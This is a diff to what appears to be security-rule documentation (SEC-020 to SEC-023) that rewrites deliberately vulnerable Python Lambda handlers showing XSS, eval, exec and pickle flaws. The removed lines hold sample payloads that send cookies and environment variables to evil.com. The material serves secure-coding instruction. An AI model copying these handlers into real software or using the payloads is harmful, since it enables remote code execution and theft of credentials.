@@ -54,37 +54,38 @@ VULNERABLE EXAMPLE:
 ```python
 import json
 import pickle
-import base64
 
-def lambda_handler(event, context):
-    # VULNERABLE: XSS in HTML response
-    name = event.get('name', '')
-    html = f'<html><body><h1>Hello, {name}!</h1></body></html>'
+
+# SEC-020: tainted HTML response
+def handler_html_response(event, context):
+    name = event.get('name')
+    body = f"<html><body>Hello {name}</body></html>"
     return {
-        'statusCode': 200,
-        'headers': {'Content-Type': 'text/html'},
-        'body': html  # XSS if name contains <script>alert(1)</script>
+        "statusCode": 200,
+        "body": json.dumps({"html": body}),
+        "headers": {"Content-Type": "text/html"}
     }
 
-def process_handler(event, context):
-    # VULNERABLE: eval() with event data
-    expression = event.get('calc', '')
-    result = eval(expression)  # Code injection!
 
-    # VULNERABLE: exec() with event data
-    code = event.get('code', '')
-    exec(code)  # Arbitrary code execution!
+# SEC-022: eval with event data
+def handler_eval(event, context):
+    expr = event.get('expression')
+    result = eval(expr)
+    return {"statusCode": 200, "body": json.dumps({"result": str(result)})}
 
-    # VULNERABLE: pickle deserialization of event data
-    data = event.get('serialized', '')
-    obj = pickle.loads(base64.b64decode(data))  # RCE!
 
-    return {'statusCode': 200, 'body': json.dumps({'result': str(result)})}
+# SEC-022: exec with event data
+def handler_exec(event, context):
+    code = event.get('code')
+    exec(code)
+    return {"statusCode": 200}
 
-# Attack payloads:
-# XSS: {"name": "<script>document.location='https://evil.com/?c='+document.cookie</script>"}
-# eval: {"calc": "__import__('os').system('env | curl -X POST -d @- https://evil.com')"}
-# pickle: {"serialized": "<base64-encoded pickle with __reduce__ RCE>"}
+
+# SEC-023: pickle deserialization
+def handler_pickle(event, context):
+    data = event.get('payload')
+    obj = pickle.loads(data)
+    return {"statusCode": 200, "body": json.dumps(str(obj))}
 ```
 
 SECURE EXAMPLE:
